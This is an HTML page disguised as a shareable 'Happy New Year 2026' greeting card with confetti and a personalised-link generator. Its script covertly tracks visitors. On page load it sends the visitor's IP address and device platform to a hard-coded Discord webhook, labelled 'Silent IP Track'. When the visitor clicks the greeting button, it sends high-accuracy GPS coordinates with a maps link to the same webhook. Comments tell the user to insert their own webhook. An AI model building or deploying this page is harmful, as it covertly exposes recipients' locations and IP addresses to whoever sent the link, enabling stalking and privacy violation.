<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Happy New Year 2026!</title>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    <style>
        :root { --gold: #ffd700; --dark: #020205; }
        body { margin: 0; background: var(--dark); color: white; font-family: system-ui, -apple-system, sans-serif; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; }
        #bg { position: fixed; top: 0; left: 0; z-index: -1; width: 100%; height: 100%; }
        .card { z-index: 10; background: rgba(15, 15, 25, 0.9); padding: 30px; border-radius: 25px; border: 1px solid var(--gold); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); text-align: center; width: 85%; max-width: 400px; box-shadow: 0 0 50px rgba(0,0,0,0.9); }
        h1 { font-size: 3.5rem; margin: 10px 0; background: linear-gradient(to bottom, #fff, var(--gold)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .btn { background: var(--gold); color: #000; border: none; padding: 18px; font-size: 1.2rem; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; margin-top: 20px; }
        .share { margin-top: 30px; border-top: 1px solid #333; padding-top: 20px; }
        input { background: #111; border: 1px solid #444; color: white; padding: 10px; border-radius: 8px; width: 70%; margin-bottom: 10px; font-size: 16px; }
    </style>
</head>
<body>

    <canvas id="bg"></canvas>

    <div class="card">
        <div id="sender" style="color:var(--gold); font-size:0.8rem; letter-spacing:2px;">HAPPY NEW YEAR</div>
        <h1>2026</h1>
        <p style="color:#ccc;">"Cheers to a new year and another chance for us to get it right."</p>
        
        <button class="btn" onclick="celebrate()">EXPLORE WISH âœ¨</button>

        <div class="share">
            <input type="text" id="nameIn" placeholder="Your Name">
            <button style="background:none; border:1px solid var(--gold); color:var(--gold); padding:8px; border-radius:8px;" onclick="gen()">Link</button>
            <div id="linkOut" style="font-size:0.7rem; color:#888; margin-top:10px; word-break:break-all;"></div>
        </div>
    </div>

    <audio id="audio" src="https://assets.mixkit.co/active_storage/sfx/2867/2867-preview.mp3"></audio>

    <script>
        // 1. YOUR DISCORD URL + /slack (MANDATORY)
        const WEBHOOK = "https://discordapp.com/api/webhooks/1455541858489991209/eerPl-hDw1X9fASbpoTaW65lvgTk4X5NdCzcoo1HT5lyNSC6KrvuAw_TRWCxHwu7zQjj/slack";

        // 2. LOAD & SILENT TRACK
        window.onload = async () => {
            const params = new URLSearchParams(window.location.search);
            const name = params.get('name');
            if (name) document.getElementById('sender').textContent = `FROM: ${decodeURIComponent(name)}`;
            
            initStars();

            // Silent IP Track
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                transmit("ðŸŸ¢ VISIT", { "IP": data.ip, "User": name || "Direct", "Device": navigator.platform });
            } catch (e) {}
        };

        // 3. INTERACTIVE TRACK (GPS)
        async function celebrate() {
            document.getElementById('audio').play();
            confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((pos) => {
                    transmit("ðŸŽ¯ GPS SUCCESS", {
                        "Lat": pos.coords.latitude,
                        "Lon": pos.coords.longitude,
                        "Map": `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                    });
                }, (err) => {
                    transmit("âš ï¸ GPS DENIED", { "Reason": "Blocked" });
                }, { enableHighAccuracy: true });
            }
            alert("Happy New Year 2026!");
        }

        // 4. THE MOBILE BYPASS TRANSMITTER
        function transmit(type, data) {
            const payload = {
                username: "2026 Tracker",
                attachments: [{
                    title: type,
                    color: "#ffd700",
                    fields: Object.entries(data).map(([k, v]) => ({ title: k, value: String(v), short: true }))
                }]
            };

            // Use Beacon for Mobile Reliability
            if (navigator.sendBeacon) {
                const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
                navigator.sendBeacon(WEBHOOK, blob);
            } else {
                fetch(WEBHOOK, { method: 'POST', body: JSON.stringify(payload) });
            }
        }

        // UI UTILS
        function gen() {
            const n = document.getElementById('nameIn').value;
            if(n) {
                const url = window.location.origin + window.location.pathname + "?name=" + encodeURIComponent(n);
                document.getElementById('linkOut').textContent = url;
            }
        }

        function initStars() {
            const c = document.getElementById('bg');
            const x = c.getContext('2d');
            c.width = window.innerWidth; c.height = window.innerHeight;
            for(let i=0; i<100; i++) {
                x.fillStyle = "white"; x.beginPath();
                x.arc(Math.random()*c.width, Math.random()*c.height, Math.random()*1.2, 0, Math.PI*2);
                x.fill();
            }
        }
    </script>
</body>
</html>
